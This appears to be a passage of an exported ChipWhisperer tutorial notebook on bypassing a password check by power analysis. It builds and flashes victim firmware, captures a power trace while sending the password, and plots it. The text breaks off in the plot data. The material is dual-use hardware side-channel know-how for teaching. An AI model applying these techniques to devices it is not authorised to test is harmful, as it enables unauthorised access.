
Timing Analysis with Power for Password Bypass
==============================================

This tutorial will introduce you to breaking devices by determining when
a device is performing certain operations. It will use a simple password
check, and demonstrate how to perform a basic power analysis.

Note this is not a prerequisite to the tutorial on breaking AES. You can
skip this tutorial if you wish to go ahead with the AES tutorial.


**In [1]:**

.. code:: ipython3

    SCOPETYPE = 'CWNANO'
    PLATFORM = 'CWNANO'
    CRYPTO_TARGET = 'NONE'

Firmware
--------

Like before, we'll need to setup our ``PLATFORM``, then build the
firmware:


**In [2]:**

.. code:: bash

    %%bash -s "$PLATFORM" "$CRYPTO_TARGET"
    cd ../hardware/victims/firmware/basic-passwdcheck
    make PLATFORM=$1 CRYPTO_TARGET=$2


**Out [2]:**



.. parsed-literal::

    rm -f -- basic-passwdcheck-CWNANO.hex
    rm -f -- basic-passwdcheck-CWNANO.eep
    rm -f -- basic-passwdcheck-CWNANO.cof
    rm -f -- basic-passwdcheck-CWNANO.elf
    rm -f -- basic-passwdcheck-CWNANO.map
    rm -f -- basic-passwdcheck-CWNANO.sym
    rm -f -- basic-passwdcheck-CWNANO.lss
    rm -f -- objdir/\*.o
    rm -f -- objdir/\*.lst
    rm -f -- basic-passwdcheck.s simpleserial.s stm32f0_hal_nano.s stm32f0_hal_lowlevel.s
    rm -f -- basic-passwdcheck.d simpleserial.d stm32f0_hal_nano.d stm32f0_hal_lowlevel.d
    rm -f -- basic-passwdcheck.i simpleserial.i stm32f0_hal_nano.i stm32f0_hal_lowlevel.i
    .
    -------- begin --------
    arm-none-eabi-gcc (GNU Tools for Arm Embedded Processors 7-2018-q2-update) 7.3.1 20180622 (release) [ARM/embedded-7-branch revision 261907]
    Copyright (C) 2017 Free Software Foundation, Inc.
    This is free software; see the source for copying conditions.  There is NO
    warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
    
    .
    Compiling C: basic-passwdcheck.c
    arm-none-eabi-gcc -c -mcpu=cortex-m0 -I. -mthumb -mfloat-abi=soft -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_0 -DSTM32F030x6 -DSTM32F0 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f0_nano -DPLATFORM=CWNANO -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/basic-passwdcheck.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f0 -I.././hal/stm32f0/CMSIS -I.././hal/stm32f0/CMSIS/core -I.././hal/stm32f0/CMSIS/device -I.././hal/stm32f0/Legacy -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/basic-passwdcheck.o.d basic-passwdcheck.c -o objdir/basic-passwdcheck.o 
    .
    Compiling C: .././simpleserial/simpleserial.c
    arm-none-eabi-gcc -c -mcpu=cortex-m0 -I. -mthumb -mfloat-abi=soft -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_0 -DSTM32F030x6 -DSTM32F0 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f0_nano -DPLATFORM=CWNANO -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/simpleserial.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f0 -I.././hal/stm32f0/CMSIS -I.././hal/stm32f0/CMSIS/core -I.././hal/stm32f0/CMSIS/device -I.././hal/stm32f0/Legacy -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/simpleserial.o.d .././simpleserial/simpleserial.c -o objdir/simpleserial.o 
    .
    Compiling C: .././hal/stm32f0_nano/stm32f0_hal_nano.c
    arm-none-eabi-gcc -c -mcpu=cortex-m0 -I. -mthumb -mfloat-abi=soft -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_0 -DSTM32F030x6 -DSTM32F0 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f0_nano -DPLATFORM=CWNANO -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/stm32f0_hal_nano.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f0 -I.././hal/stm32f0/CMSIS -I.././hal/stm32f0/CMSIS/core -I.././hal/stm32f0/CMSIS/device -I.././hal/stm32f0/Legacy -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/stm32f0_hal_nano.o.d .././hal/stm32f0_nano/stm32f0_hal_nano.c -o objdir/stm32f0_hal_nano.o 
    .
    Compiling C: .././hal/stm32f0/stm32f0_hal_lowlevel.c
    arm-none-eabi-gcc -c -mcpu=cortex-m0 -I. -mthumb -mfloat-abi=soft -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_0 -DSTM32F030x6 -DSTM32F0 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f0_nano -DPLATFORM=CWNANO -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/stm32f0_hal_lowlevel.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f0 -I.././hal/stm32f0/CMSIS -I.././hal/stm32f0/CMSIS/core -I.././hal/stm32f0/CMSIS/device -I.././hal/stm32f0/Legacy -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/stm32f0_hal_lowlevel.o.d .././hal/stm32f0/stm32f0_hal_lowlevel.c -o objdir/stm32f0_hal_lowlevel.o 
    .
    Assembling: .././hal/stm32f0/stm32f0_startup.S
    arm-none-eabi-gcc -c -mcpu=cortex-m0 -I. -x assembler-with-cpp -mthumb -mfloat-abi=soft -ffunction-sections -DF_CPU=7372800 -Wa,-gstabs,-adhlns=objdir/stm32f0_startup.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f0 -I.././hal/stm32f0/CMSIS -I.././hal/stm32f0/CMSIS/core -I.././hal/stm32f0/CMSIS/device -I.././hal/stm32f0/Legacy -I.././crypto/ .././hal/stm32f0/stm32f0_startup.S -o objdir/stm32f0_startup.o
    .
    Linking: basic-passwdcheck-CWNANO.elf
    arm-none-eabi-gcc -mcpu=cortex-m0 -I. -mthumb -mfloat-abi=soft -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_0 -DSTM32F030x6 -DSTM32F0 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f0_nano -DPLATFORM=CWNANO -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/basic-passwdcheck.o -I.././simpleserial/ -I.././hal -I.././hal/stm32f0 -I.././hal/stm32f0/CMSIS -I.././hal/stm32f0/CMSIS/core -I.././hal/stm32f0/CMSIS/device -I.././hal/stm32f0/Legacy -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/basic-passwdcheck-CWNANO.elf.d objdir/basic-passwdcheck.o objdir/simpleserial.o objdir/stm32f0_hal_nano.o objdir/stm32f0_hal_lowlevel.o objdir/stm32f0_startup.o --output basic-passwdcheck-CWNANO.elf --specs=nano.specs --specs=nosys.specs -T .././hal/stm32f0_nano/LinkerScript.ld -Wl,--gc-sections -lm -mthumb -mcpu=cortex-m0  -Wl,-Map=basic-passwdcheck-CWNANO.map,--cref   -lm  
    .
    Creating load file for Flash: basic-passwdcheck-CWNANO.hex
    arm-none-eabi-objcopy -O ihex -R .eeprom -R .fuse -R .lock -R .signature basic-passwdcheck-CWNANO.elf basic-passwdcheck-CWNANO.hex
    .
    Creating load file for EEPROM: basic-passwdcheck-CWNANO.eep
    arm-none-eabi-objcopy -j .eeprom --set-section-flags=.eeprom="alloc,load" \
    	--change-section-lma .eeprom=0 --no-change-warnings -O ihex basic-passwdcheck-CWNANO.elf basic-passwdcheck-CWNANO.eep || exit 0
    .
    Creating Extended Listing: basic-passwdcheck-CWNANO.lss
    arm-none-eabi-objdump -h -S -z basic-passwdcheck-CWNANO.elf > basic-passwdcheck-CWNANO.lss
    .
    Creating Symbol Table: basic-passwdcheck-CWNANO.sym
    arm-none-eabi-nm -n basic-passwdcheck-CWNANO.elf > basic-passwdcheck-CWNANO.sym
    Size after:
       text	   data	    bss	    dec	    hex	filename
       5384	    112	   1184	   6680	   1a18	basic-passwdcheck-CWNANO.elf
    +--------------------------------------------------------
    + Built for platform CWNANO STM32F030
    +--------------------------------------------------------





.. parsed-literal::

    .././simpleserial/simpleserial.c: In function 'simpleserial_get':
    .././simpleserial/simpleserial.c:131:10: warning: variable 'ret' set but not used [-Wunused-but-set-variable]
      uint8_t ret[1];
              ^~~



Setup
-----

Setup is the same as usual, except this time we'll be capturing 2000
traces.


**In [3]:**

.. code:: ipython3

    %run "Helper_Scripts/Setup.ipynb"


**In [4]:**

.. code:: ipython3

    fw_path = '../hardware/victims/firmware/basic-passwdcheck/basic-passwdcheck-{}.hex'.format(PLATFORM)


**In [5]:**

.. code:: ipython3

    cw.program_target(scope, prog, fw_path)


**Out [5]:**



.. parsed-literal::

    Detected unknown STM32F ID: 0x445
    Extended erase (0x44), this can take ten seconds or more
    Attempting to program 5495 bytes at 0x8000000
    STM32F Programming flash...
    STM32F Reading flash...
    Verified flash OK, 5495 bytes
    


Communicating With The Target
-----------------------------

As was mentioned at the beginning of the tutorial, the firmware we
loaded onto the target implements a basic password check. After getting
a ``'\n'`` terminated password, the target checks it and enters an
infinite loop, so before communicating with it, we'll need to reset it.

We'll be doing this a lot, so we'll define a function that resets the
target (this function is also available by running
"Helper\_Scripts/Setup.ipynb" as we did above):


**In [6]:**

.. code:: ipython3

    import time
    def reset_target(scope):
        if PLATFORM == "CW303" or PLATFORM == "CWLITEXMEGA":
            scope.io.pdic = 'low'
            time.sleep(0.05)
            scope.io.pdic = 'high'
            time.sleep(0.05)
        else:  
            scope.io.nrst = 'low'
            time.sleep(0.05)
            scope.io.nrst = 'high'
            time.sleep(0.05)

The target sends some text to us upon starting. After running the block
below, you should see some text appear.

**NOTE** The text may appear cutoff, accompanied by a message about data
loss. This means that the buffer used to store serial data (128 bytes)
from the target is full. This isn't an issue here, since the text is
just aesthetic, but keep this in mind if you want to do large transfers
of serial data using ChipWhisperer.


**In [7]:**

.. code:: ipython3

    ret = ""
    reset_target(scope)
    
    num_char = target.in_waiting()
    while num_char > 0:
        ret += target.read(timeout=10)
        time.sleep(0.05)
        num_char = target.in_waiting()
        
    print(ret)


**Out [7]:**



.. parsed-literal::

    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    




.. parsed-literal::

    \*\*\*\*\*Safe-o-matic 3000 Booting...
    Aligning bits........[DONE]
    Checking Cesium RNG..[DONE]
    Masquerading flash...[DONE]
    Decryptin
    
    WARNING: UNAUTHORIZED ACCESS WILL BE PUNISHED
    Please enter password to continue: 
    


Now we can send the target a password:


**In [8]:**

.. code:: ipython3

    target.flush()
    target.write("h0px3\n")

And get the response. We sent it the right password (hopx3), so you
should see "Access granted, Welcome!":


**In [9]:**

.. code:: ipython3

    print(target.read(timeout=100))


**Out [9]:**



.. parsed-literal::

    Access granted, Welcome!
    
    


**tip**

In real systems, you may often know one of the passwords, which is
sufficient to investigate the password checking routines as we will do.
You also normally have an ability to reset passwords to default. While
the reset procedure would erase any data you care about, the attacker
will be able to use this 'sacrificial' device to learn about possible
vulnerabilities. So the assumption that we have access to the password
is really just saying we have access to a password, and will use that
knowledge to break the system in general.

Recording Traces
----------------

Now that we can communicate with our super-secure system, our next goal
is to get a power trace while the target is running. To do this, we'll
arm the scope just before we send our password attempt, then record the
trace as we've done before.


**In [10]:**

.. code:: ipython3

    if PLATFORM == "CWNANO":
        scope.adc.samples = 800
    else:
        scope.adc.samples = 2000


**In [11]:**

.. code:: ipython3

    ret = ""
    reset_target(scope)
    num_char = target.in_waiting()
    while num_char > 0:
        ret += target.read(timeout=10)
        time.sleep(0.01)
        num_char = target.in_waiting()
        
    print(ret)
    scope.arm()
    target.flush()
    target.write("h0px3\n")
    ret = scope.capture()
    if ret:
        print('Timeout happened during acquisition')
            
    trace = scope.get_last_trace()
    resp = ""
    num_char = target.in_waiting()
    while num_char > 0:
        resp += target.read(timeout=10)
        time.sleep(0.01)
        num_char = target.in_waiting()
    print(resp)


**Out [11]:**



.. parsed-literal::

    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    




.. parsed-literal::

    \*\*\*\*\*Safe-o-matic 3000 Booting...
    Aligning bits........[DONE]
    Checking Cesium RNG..[DONE]
    Masquerading flash...[DONE]
    Decryptin
    
    WARNING: UNAUTHORIZED ACCESS WILL BE PUNISHED
    Please enter password to continue: 
    Access granted, Welcome!
    
    


Now that we have a trace, we'll use bokeh to plot it:


**In [12]:**

.. code:: ipython3

    from bokeh.plotting import figure, show 
    from bokeh.io import output_notebook
    from bokeh.models import CrosshairTool
    
    output_notebook()
    p = figure()
    x_range = range(0, len(trace))
    p.line(x_range, trace)
    show(p)


**Out [12]:**


.. raw:: html

    <div class="data_html">
        
        <div class="bk-root">
            <a href="https://bokeh.pydata.org" target="_blank" class="bk-logo bk-logo-small bk-logo-notebook"></a>
            <span id="1001">Loading BokehJS ...</span>
        </div>
    </div>



.. raw:: html

    

    <div id="b31befe0-46da-446d-9d4a-2ed348196e63"></div>
    <div class="output_subarea output_javascript ">
    <script type="text/javascript">
    var element = $('#b31befe0-46da-446d-9d4a-2ed348196e63');
        
    (function(root) {
      function now() {
        return new Date();
      }
    
      var force = true;
    
      if (typeof root._bokeh_onload_callbacks === "undefined" || force === true) {
        root._bokeh_onload_callbacks = [];
        root._bokeh_is_loading = undefined;
      }
    
      var JS_MIME_TYPE = 'application/javascript';
      var HTML_MIME_TYPE = 'text/html';
      var EXEC_MIME_TYPE = 'application/vnd.bokehjs_exec.v0+json';
      var CLASS_NAME = 'output_bokeh rendered_html';
    
      /**
       * Render data to the DOM node
       */
      function render(props, node) {
        var script = document.createElement("script");
        node.appendChild(script);
      }
    
      /**
       * Handle when an output is cleared or removed
       */
      function handleClearOutput(event, handle) {
        var cell = handle.cell;
    
        var id = cell.output_area._bokeh_element_id;
        var server_id = cell.output_area._bokeh_server_id;
        // Clean up Bokeh references
        if (id != null && id in Bokeh.index) {
          Bokeh.index[id].model.document.clear();
          delete Bokeh.index[id];
        }
    
        if (server_id !== undefined) {
          // Clean up Bokeh references
          var cmd = "from bokeh.io.state import curstate; print(curstate().uuid_to_server['" + server_id + "'].get_sessions()[0].document.roots[0]._id)";
          cell.notebook.kernel.execute(cmd, {
            iopub: {
              output: function(msg) {
                var id = msg.content.text.trim();
                if (id in Bokeh.index) {
                  Bokeh.index[id].model.document.clear();
                  delete Bokeh.index[id];
                }
              }
            }
          });
          // Destroy server and session
          var cmd = "import bokeh.io.notebook as ion; ion.destroy_server('" + server_id + "')";
          cell.notebook.kernel.execute(cmd);
        }
      }
    
      /**
       * Handle when a new output is added
       */
      function handleAddOutput(event, handle) {
        var output_area = handle.output_area;
        var output = handle.output;
    
        // limit handleAddOutput to display_data with EXEC_MIME_TYPE content only
        if ((output.output_type != "display_data") || (!output.data.hasOwnProperty(EXEC_MIME_TYPE))) {
          return
        }
    
        var toinsert = output_area.element.find("." + CLASS_NAME.split(' ')[0]);
    
        if (output.metadata[EXEC_MIME_TYPE]["id"] !== undefined) {
          toinsert[toinsert.length - 1].firstChild.textContent = output.data[JS_MIME_TYPE];
          // store reference to embed id on output_area
          output_area._bokeh_element_id = output.metadata[EXEC_MIME_TYPE]["id"];
        }
        if (output.metadata[EXEC_MIME_TYPE]["server_id"] !== undefined) {
          var bk_div = document.createElement("div");
          bk_div.innerHTML = output.data[HTML_MIME_TYPE];
          var script_attrs = bk_div.children[0].attributes;
          for (var i = 0; i < script_attrs.length; i++) {
            toinsert[toinsert.length - 1].firstChild.setAttribute(script_attrs[i].name, script_attrs[i].value);
          }
          // store reference to server id on output_area
          output_area._bokeh_server_id = output.metadata[EXEC_MIME_TYPE]["server_id"];
        }
      }
    
      function register_renderer(events, OutputArea) {
    
        function append_mime(data, metadata, element) {
          // create a DOM node to render to
          var toinsert = this.create_output_subarea(
            metadata,
            CLASS_NAME,
            EXEC_MIME_TYPE
          );
          this.keyboard_manager.register_events(toinsert);
          // Render to node
          var props = {data: data, metadata: metadata[EXEC_MIME_TYPE]};
          render(props, toinsert[toinsert.length - 1]);
          element.append(toinsert);
          return toinsert
        }
    
        /* Handle when an output is cleared or removed */
        events.on('clear_output.CodeCell', handleClearOutput);
        events.on('delete.Cell', handleClearOutput);
    
        /* Handle when a new output is added */
        events.on('output_added.OutputArea', handleAddOutput);
    
        /**
         * Register the mime type and append_mime function with output_area
         */
        OutputArea.prototype.register_mime_type(EXEC_MIME_TYPE, append_mime, {
          /* Is output safe? */
          safe: true,
          /* Index of renderer in `output_area.display_order` */
          index: 0
        });
      }
    
      // register the mime type if in Jupyter Notebook environment and previously unregistered
      if (root.Jupyter !== undefined) {
        var events = require('base/js/events');
        var OutputArea = require('notebook/js/outputarea').OutputArea;
    
        if (OutputArea.prototype.mime_types().indexOf(EXEC_MIME_TYPE) == -1) {
          register_renderer(events, OutputArea);
        }
      }
    
      
      if (typeof (root._bokeh_timeout) === "undefined" || force === true) {
        root._bokeh_timeout = Date.now() + 5000;
        root._bokeh_failed_load = false;
      }
    
      var NB_LOAD_WARNING = {'data': {'text/html':
         "<div style='background-color: #fdd'>\n"+
         "<p>\n"+
         "BokehJS does not appear to have successfully loaded. If loading BokehJS from CDN, this \n"+
         "may be due to a slow or bad network connection. Possible fixes:\n"+
         "</p>\n"+
         "<ul>\n"+
         "<li>re-rerun `output_notebook()` to attempt to load from CDN again, or</li>\n"+
         "<li>use INLINE resources instead, as so:</li>\n"+
         "</ul>\n"+
         "<code>\n"+
         "from bokeh.resources import INLINE\n"+
         "output_notebook(resources=INLINE)\n"+
         "</code>\n"+
         "</div>"}};
    
      function display_loaded() {
        var el = document.getElementById("1001");
        if (el != null) {
          el.textContent = "BokehJS is loading...";
        }
        if (root.Bokeh !== undefined) {
          if (el != null) {
            el.textContent = "BokehJS " + root.Bokeh.version + " successfully loaded.";
          }
        } else if (Date.now() < root._bokeh_timeout) {
          setTimeout(display_loaded, 100)
        }
      }
    
    
      function run_callbacks() {
        try {
          root._bokeh_onload_callbacks.forEach(function(callback) {
            if (callback != null)
              callback();
          });
        } finally {
          delete root._bokeh_onload_callbacks
        }
        console.debug("Bokeh: all callbacks have finished");
      }
    
      function load_libs(css_urls, js_urls, callback) {
        if (css_urls == null) css_urls = [];
        if (js_urls == null) js_urls = [];
    
        root._bokeh_onload_callbacks.push(callback);
        if (root._bokeh_is_loading > 0) {
          console.debug("Bokeh: BokehJS is being loaded, scheduling callback at", now());
          return null;
        }
        if (js_urls == null || js_urls.length === 0) {
          run_callbacks();
          return null;
        }
        console.debug("Bokeh: BokehJS not loaded, scheduling load and callback at", now());
        root._bokeh_is_loading = css_urls.length + js_urls.length;
    
        function on_load() {
          root._bokeh_is_loading--;
          if (root._bokeh_is_loading === 0) {
            console.debug("Bokeh: all BokehJS libraries/stylesheets loaded");
            run_callbacks()
          }
        }
    
        function on_error() {
          console.error("failed to load " + url);
        }
    
        for (var i = 0; i < css_urls.length; i++) {
          var url = css_urls[i];
          const element = document.createElement("link");
          element.onload = on_load;
          element.onerror = on_error;
          element.rel = "stylesheet";
          element.type = "text/css";
          element.href = url;
          console.debug("Bokeh: injecting link tag for BokehJS stylesheet: ", url);
          document.body.appendChild(element);
        }
    
        for (var i = 0; i < js_urls.length; i++) {
          var url = js_urls[i];
          var element = document.createElement('script');
          element.onload = on_load;
          element.onerror = on_error;
          element.async = false;
          element.src = url;
          console.debug("Bokeh: injecting script tag for BokehJS library: ", url);
          document.head.appendChild(element);
        }
      };var element = document.getElementById("1001");
      if (element == null) {
        console.error("Bokeh: ERROR: autoload.js configured with elementid '1001' but no matching script tag was found. ")
        return false;
      }
    
      function inject_raw_css(css) {
        const element = document.createElement("style");
        element.appendChild(document.createTextNode(css));
        document.body.appendChild(element);
      }
    
      var js_urls = ["https://cdn.pydata.org/bokeh/release/bokeh-1.2.0.min.js", "https://cdn.pydata.org/bokeh/release/bokeh-widgets-1.2.0.min.js", "https://cdn.pydata.org/bokeh/release/bokeh-tables-1.2.0.min.js", "https://cdn.pydata.org/bokeh/release/bokeh-gl-1.2.0.min.js"];
      var css_urls = ["https://cdn.pydata.org/bokeh/release/bokeh-1.2.0.min.css", "https://cdn.pydata.org/bokeh/release/bokeh-widgets-1.2.0.min.css", "https://cdn.pydata.org/bokeh/release/bokeh-tables-1.2.0.min.css"];
    
      var inline_js = [
        function(Bokeh) {
          Bokeh.set_log_level("info");
        },
        
        function(Bokeh) {
          
        },
        function(Bokeh) {} // ensure no trailing comma for IE
      ];
    
      function run_inline_js() {
        
        if ((root.Bokeh !== undefined) || (force === true)) {
          for (var i = 0; i < inline_js.length; i++) {
            inline_js[i].call(root, root.Bokeh);
          }if (force === true) {
            display_loaded();
          }} else if (Date.now() < root._bokeh_timeout) {
          setTimeout(run_inline_js, 100);
        } else if (!root._bokeh_failed_load) {
          console.log("Bokeh: BokehJS failed to load within specified timeout.");
          root._bokeh_failed_load = true;
        } else if (force !== true) {
          var cell = $(document.getElementById("1001")).parents('.cell').data().cell;
          cell.output_area.append_execute_result(NB_LOAD_WARNING)
        }
    
      }
    
      if (root._bokeh_is_loading === 0) {
        console.debug("Bokeh: BokehJS loaded, going straight to plotting");
        run_inline_js();
      } else {
        load_libs(css_urls, js_urls, function() {
          console.debug("Bokeh: BokehJS plotting callback run at", now());
          run_inline_js();
        });
      }
    }(window));
    </script>
    </div>


.. raw:: html

    <div class="data_html">
        
    
    
    
    
    
      <div class="bk-root" id="6331c1d7-304f-4366-95a2-2a079696330a" data-root-id="1002"></div>
    
    </div>



.. raw:: html

    

    <div id="1c3692d6-4e71-4b92-b9ab-5f403702a001"></div>
    <div class="output_subarea output_javascript ">
    <script type="text/javascript">
    var element = $('#1c3692d6-4e71-4b92-b9ab-5f403702a001');
        (function(root) {
      function embed_document(root) {
        
      var docs_json = {"609341b6-198c-40f8-bbca-05967d1f3506":{"roots":{"references":[{"attributes":{"below":[{"id":"1011","type":"LinearAxis"}],"center":[{"id":"1015","type":"Grid"},{"id":"1020","type":"Grid"}],"left":[{"id":"1016","type":"LinearAxis"}],"renderers":[{"id":"1037","type":"GlyphRenderer"}],"title":{"id":"1039","type":"Title"},"toolbar":{"id":"1027","type":"Toolbar"},"x_range":{"id":"1003","type":"DataRange1d"},"x_scale":{"id":"1007","type":"LinearScale"},"y_range":{"id":"1005","type":"DataRange1d"},"y_scale":{"id":"1009","type":"LinearScale"}},"id":"1002","subtype":"Figure","type":"Plot"},{"attributes":{"data_source":{"id":"1034","type":"ColumnDataSource"},"glyph":{"id":"1035","type":"Line"},"hover_glyph":null,"muted_glyph":null,"nonselection_glyph":{"id":"1036","type":"Line"},"selection_glyph":null,"view":{"id":"1038","type":"CDSView"}},"id":"1037","type":"GlyphRenderer"},{"attributes":{"text":""},"id":"1039","type":"Title"},{"attributes":{},"id":"1042","type":"BasicTickFormatter"},{"attributes":{},"id":"1044","type":"BasicTickFormatter"},{"attributes":{},"id":"1045","type":"UnionRenderers"},{"attributes":{},"id":"1046","type":"Selection"},{"attributes":{"bottom_units":"screen","fill_alpha":{"value":0.5},"fill_color":{"value":"lightgrey"},"left_units":"screen","level":"overlay","line_alpha":{"value":1.0},"line_color":{"value":"black"},"line_dash":[4,4],"line_width":{"value":2},"render_mode":"css","right_units":"screen","top_units":"screen"},"id":"1047","type":"BoxAnnotation"},{"attributes":{},"id":"1007","type":"LinearScale"},{"attributes":{"callback":null,"data":{"x":[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255,256,257,258,259,260,261,262,263,264,265,266,267,268,269,270,271,272,273,274,275,276,277,278,279,280,281,282,283,284,285,286,287,288,289,290,291,292,293,294,295,296,297,298,299,300,301,302,303,304,305,306,307,308,309,310,311,312,313,314,315,316,317,318,319,320,321,322,323,324,325,326,327,328,329,330,331,332,333,334,335,336,337,338,339,340,341,342,343,344,345,346,347,348,349,350,351,352,353,354,355,356,357,358,359,360,361,362,363,364,365,366,367,368,369,370,371,372,373,374,375,376,377,378,379,380,381,382,383,384,385,386,387,388,389,390,391,392,393,394,395,396,397,398,399,400,401,402,403,404,405,406,407,408,409,410,411,412,413,414,415,416,417,418,419,420,421,422,423,424,425,426,427,428,429,430,431,432,433,434,435,436,437,438,439,440,441,442,443,444,445,446,447,448,449,450,451,452,453,454,455,456,457,458,459,460,461,462,463,464,465,466,467,468,469,470,471,472,473,474,475,476,477,478,479,480,481,482,483,484,485,486,487,488,489,490,491,492,493,494,495,496,497,498,499,500,501,502,503,504,505,506,507,508,509,510,511,512,513,514,515,516,517,518,519,520,521,522,523,524,525,526,527,528,529,530,531,532,533,534,535,536,537,538,539,540,541,542,543,544,545,546,547,548,549,550,551,552,553,554,555,556,557,558,559,560,561,562,563,564,565,566,567,568,569,570,571,572,573,574,575,576,577,578,579,580,581,582,583,584,585,586,587,588,589,590,591,592,593,594,595,596,597,598,599,600,601,602,603,604,605,606,607,608,609,610,611,612,613,614,615,616,617,618,619,620,621,622,623,624,625,626,627,628,629,630,631,632,633,634,635,636,637,638,639,640,641,642,643,644,645,646,647,648,649,650,651,652,653,654,655,656,657,658,659,660,661,662,663,664,665,666,667,668,669,670,671,672,673,674,675,676,677,678,679,680,681,682,683,684,685,686,687,688,689,690,691,692,693,694,695,696,697,698,699,700,701,702,703,704,705,706,707,708,709,710,711,712,713,714,715,716,717,718,719,720,721,722,723,724,725,726,727,728,729,730,731,732,733,734,735,736,737,738,739,740,741,742,743,744,745,746,747,748,749,750,751,752,753,754,755,756,757,758,759,760,761,762,763,764,765,766,767,768,769,770,771,772,773,774,775,776,777,778,779,780,781,782,783,784,785,786,787,788,789,790,791,792,793,794,795,796,797,798,799],"y":{"__ndarray__":"AAAAAACAwT8AAAAAAIDFPwAAAAAAAKK/AAAAAAAAqr8AAAAAAACzPwAAAAAAAHA/AAAAAAAArr8AAAAAAACUPwAAAAAAAKK/AAAAAAAAyL8AAAAAAACcvwAAAAAAAJA/AAAAAAAAs78AAAAAAIDCPwAAAAAAAMc/AAAAAAAArr8AAAAAAACoPwAAAAAAgMk/AAAAAAAAsb8AAAAAAAC7PwAAAAAAAKK/AAAAAACAzT8AAAAAAAC8PwAAAAAAAL+/AAAAAAAAvT8AAAAAAIDCPwAAAAAAALO/AAAAAAAAoj8AAAAAAIDHPwAAAAAAALe/AAAAAAAAtz8AAAAAAACmvwAAAAAAAM0/AAAAAAAAuT8AAAAAAADCvwAAAAAAALk/AAAAAAAAwD8AAAAAAAC3vwAAAAAAAJQ/AAAAAACAxz8AAAAAAAC5vwAAAAAAALQ/AAAAAAAAsb8AAAAAAIDKPwAAAAAAALU/AAAAAACAwr8AAAAAAAC7PwAAAAAAAME/AAAAAAAAuL8AAAAAAACUPwAAAAAAgMU/AAAAAAAAub8AAAAAAACzPwAAAAAAALC/AAAAAAAAyz8AAAAAAAC1PwAAAAAAgMO/AAAAAAAAsz8AAAAAAAC9PwAAAAAAAMO/AAAAAAAAcL8AAAAAAIDCPwAAAAAAALy/AAAAAAAAtT8AAAAAAACxvwAAAAAAgMo/AAAAAAAAsz8AAAAAAIDDvwAAAAAAALQ/AAAAAAAAuT8AAAAAAIDBvwAAAAAAAKC/AAAAAAAAvj8AAAAAAAC/vwAAAAAAALE/AAAAAAAApr8AAAAAAACyPwAAAAAAAKa/AAAAAAAAkD8AAAAAAABwvwAAAAAAALa/AAAAAAAAlL8AAAAAAIDGvwAAAAAAAL0/AAAAAAAAiD8AAAAAAAC7PwAAAAAAALU/AAAAAAAAqj8AAAAAAACQPwAAAAAAgMC/AAAAAAAAcL8AAAAAAADDvwAAAAAAAKC/AAAAAACAxb8AAAAAAADCPwAAAAAAAKa/AAAAAAAAt78AAAAAAACxvwAAAAAAAKA/AAAAAAAAsz8AAAAAAACQPwAAAAAAAL+/AAAAAACAxb8AAAAAAADMPwAAAAAAAIi/AAAAAACAwL8AAAAAAACwPwAAAAAAAAAAAAAAAAAAw78AAAAAAIDRvwAAAAAAALK/AAAAAACAxb8AAAAAAIDDPwAAAAAAAJi/AAAAAAAAmL8AAAAAAACqPwAAAAAAAKQ/AAAAAAAAtT8AAAAAAAC8PwAAAAAAAMA/AAAAAAAAqr8AAAAAAAC4vwAAAAAAwNE/AAAAAAAAtL8AAAAAAACqvwAAAAAAAHC/AAAAAACAxr8AAAAAAACwvwAAAAAAAMK/AAAAAAAAtT8AAAAAAAC3vwAAAAAAAKY/AAAAAACAwb8AAAAAAACUPwAAAAAAAK6/AAAAAA